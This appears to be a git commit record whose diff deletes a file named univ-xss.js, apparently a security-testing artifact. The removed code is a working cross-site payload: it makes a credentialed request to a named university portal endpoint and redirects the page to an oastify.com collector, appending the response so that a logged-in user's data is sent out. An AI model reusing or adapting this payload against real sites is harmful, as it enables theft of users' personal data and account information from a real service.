4888ced982049b6208cb13054e57905dd68ba41f
mrhavit <93275845+mrhavit@users.noreply.github.com>
2024-02-25 11:14:31 +0200

    a
    a

--- univ-xss.js
+++
@@ -1,9 +0,0 @@
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://opsrv.apps.openu.ac.il/MyOP/Person/HelloUser',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//e0f3gbj9jqqicqvzcgjq5v3ed5jw7mvb.oastify.com/log?key='+this.responseText; 
-};
